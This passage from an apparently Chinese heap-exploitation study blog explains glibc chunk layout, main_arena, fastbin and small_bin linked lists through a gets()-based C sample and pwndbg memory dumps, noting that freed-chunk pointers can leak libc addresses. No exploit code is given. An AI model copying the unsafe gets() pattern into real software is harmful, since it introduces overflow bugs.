daHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/02/AXyJl2ZVbYokaTw.png" alt="Snipaste_2020-03-02_23-11-42.png"></p><ol><li>prev_size 标识对前一个堆块的 <strong>size</strong> 。如果前一个堆块正被使用，那么它为 0 。</li><li>size 表示当前堆块的 <strong>size</strong> 。其中这个字段的最低位为 <strong>prev_inuse</strong> ，为了表示前一个堆块的使用情况。若正被使用则为 1 。size 的大小一定会是 16（x64）/ 8（x32）的整数倍。</li><li>若 malloc 的大小的个位 大于 0 ，小于等于 8 （比如 0x32），那么 prev_size 的八字节会被拿来保存前一个堆块的多余信息。</li><li>user_data 是 pmalloc 分配的内存空间，ptr 则为 malloc 函数所返回的地址。</li></ol><h2 id="bins">bins</h2><h3 id="main-arena">main_arena</h3><p>是一个指针数组 *<em>char <em>main_arena[]</em></em></p><p>里面保存了各个 <strong>bin</strong> 的起始地址的<strong>指针</strong> ，包括 fast_bin , small_bin , large_bin</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.imgur.com/r5Vjflz.png" alt></p><h3 id="fastbin">fastbin</h3><p>我们先写一个小程序</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">    <span class="keyword">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x21</span>);</span><br><span class="line"></span><br><span class="line">    gets(p1);</span><br><span class="line">    gets(p2);</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><p>并打开 gdb 进行调试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb <span class="built_in">test</span></span><br><span class="line">b main</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>我们定位到 gets 函数，将 p1、p2 的内存地址对应的区域找到，并且分别输入</p><p>‘a’ * 8 、 ‘b’ * 8</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/02/9yPLEOSYHrf4iaR.png" alt="Snipaste_2020-03-02_23-34-20.png"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x /32gx 0x602010-16</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000031</span><br><span class="line">0x602010:       0x6161616161616161      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000031</span><br><span class="line">0x602040:       0x6262626262626262      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>下面解释各个位置的名称</p><p>0x602000：prev_size</p><p>0x602008：size （因为是第一个堆块，所以它的 prev_inuse 一定是 1，<strong>而且因为是 fastbin ，所以 prev_inuse 始终为 1 ，这里需要注意</strong>）</p><p>0x602010：user_data</p><p>现在我们继续， free 掉 p1</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n</span><br></pre></td></tr></table></figure><p>可以看到 p1 的 user_data 被清空了</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/02/E3pqKVyGxNdMrol.png" alt="Snipaste_2020-03-02_23-34-20.png"></p><p>继续 free 掉 p2</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n</span><br></pre></td></tr></table></figure><p>可以看到 p2 的 user_data 处被替换为了 p1 的堆块地址</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/02/ksacImed67ADrli.png" alt="Snipaste_2020-03-02_23-34-20.png"></p><p>这里就得提到 fastbin 的 FILO（先进后出）</p><p>fastbin 是一个<strong>单向链表</strong>。作为 fastbin 的堆块，P1 会被 main_arena 的 0x30 指针所指</p><p>而 P2 加入时， 这个指针会被重新指向 P2，然后 P2 会指向 P1</p><p>P2 的 <strong>fd</strong> 是 user_data 的前 <strong>8 Bytes</strong> ，用来指向 P1，P1 因为没有结点可指，所以是 0</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2020/03/02/tmpgFqwbiVjDaYC.png" alt="Snipaste_2020-03-02_23-34-20.png"></p><h3 id="small-bin">small_bin</h3><p>与 fast_bin 差别不大， 但是在回收到 small_bin （之前会先进入 unsorted bin）的过程中，它会被回收到一个<strong>双向链表</strong>中。</p><p>同时 <strong>prev_size</strong> 的标志会被启用，这个在 unlink 知识点上有所应用</p><p>因为 small_bin 是用双向链表进行存储的，所以它的 <strong>user_data</strong> 的前 <strong>16Bytes</strong> 分别为 <strong>fd</strong> 和 <strong>bk</strong>，指向下一个堆块或者前一个堆块，这一点在我们进行 unlink 的时候非常有用。</p><p>同时，像 <strong>small_bin</strong> 一样的双向链表， 第一个加入其中的堆块，他的 <strong>fd</strong>、<strong>bk</strong> 都会等于同一个值，即 <strong>main_arena + offset</strong>， 这就是 <strong>use_after_free</strong> 的原理，可以写泄露 libc 的地址。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v7